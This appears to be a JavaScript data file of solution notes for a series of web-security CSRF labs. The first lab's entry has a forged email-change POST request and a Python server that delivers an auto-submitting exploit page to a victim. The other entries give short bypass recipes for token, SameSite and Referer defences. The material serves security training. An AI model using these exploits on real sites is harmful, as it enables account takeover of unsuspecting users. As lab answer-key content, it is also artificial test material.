export default {
  'csrf-lab-no-defenses': {
    note: 'The email-change form accepts a cross-site POST with only the session cookie; host an auto-submitting form.',
    work: {
      hints: [
        'Find a state-changing form (change email) and check whether it carries an unpredictable token.',
        'There is no token. The only credential is the session cookie, which the browser attaches to any request for the site.',
        'Host an HTML page with a form posting to the endpoint, auto-submit it from the exploit server, and deliver it to the victim.'
      ],
      approach:
        'No unpredictable value and no origin restriction. The attacker does not need to read the response; the browser sends the cookie and the server performs the change. The exploit page can live on any origin.',
      request: `POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=VICTIM-SESSION

email=victim%40attacker.example`,
      tokens: [
        ['POST', 'A state-changing method. The browser will send it cross-site from a form.'],
        ['/my-account/change-email', 'The target route; it authenticates from the session cookie only.'],
        ['Cookie: session', 'Ambient authority: attached by the browser because the request targets the lab origin.'],
        ['email=', 'The only parameter, fully attacker-controlled. No CSRF token is required.'],
        ['(response)', 'The attacker cannot read it, but the side effect is the goal.']
      ],
      script: `import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

host = sys.argv[1]
page = f'''<html><body>
<form action="https://{host}/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>document.forms[0].submit()</script>
</body></html>'''

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(page.encode())

print("serve this page and send the URL to the victim")
HTTPServer(("0.0.0.0", 8000), H).serve_forever()`
    }
  },
  'csrf-lab-token-validation-depends-on-request-method': {
    note: 'The token is checked on POST but not on GET; switch the request method and omit or ignore the token.'
  },
  'csrf-lab-token-validation-depends-on-token-being-present': {
    note: 'The server validates the token only if the parameter exists; simply remove it from the forged request.'
  },
  'csrf-lab-token-not-tied-to-user-session': {
    note: 'The token is valid for any session; use your own token in the request sent to the victim.'
  },
  'csrf-lab-token-tied-to-non-session-cookie': {
    note: 'The token is bound to a cookie you can set via a header-injection primitive; plant both values and forge the request.'
  },
  'csrf-lab-token-duplicated-in-cookie': {
    note: 'Double-submit compares cookie to body; set a cookie with a known value through a sibling-domain cookie setter.'
  },
  'csrf-lab-samesite-lax-bypass-via-method-override': {
    note: 'A top-level GET with `_method=POST` is treated as a POST by the framework while Lax still sends the cookie.'
  },
  'csrf-lab-samesite-strict-bypass-via-client-side-redirect': {
    note: 'A same-site redirect turns the cross-site navigation into a same-site request, so Strict cookies are attached.'
  },
  'csrf-lab-samesite-strict-bypass-via-sibling-domain': {
    note: 'A same-site sibling has an XSS or open redirect; use it to issue the request from within the site boundary.'
  },
  'csrf-lab-referer-validation-depends-on-header-being-present': {
    note: 'The Referer check is skipped when the header is missing; suppress it with a `Referrer-Policy` meta tag.'
  },
  'csrf-lab-referer-validation-broken': {
    note: 'The Referer check is a substring match; put the trusted host in the attacker URL\'s query string.'
  }
}
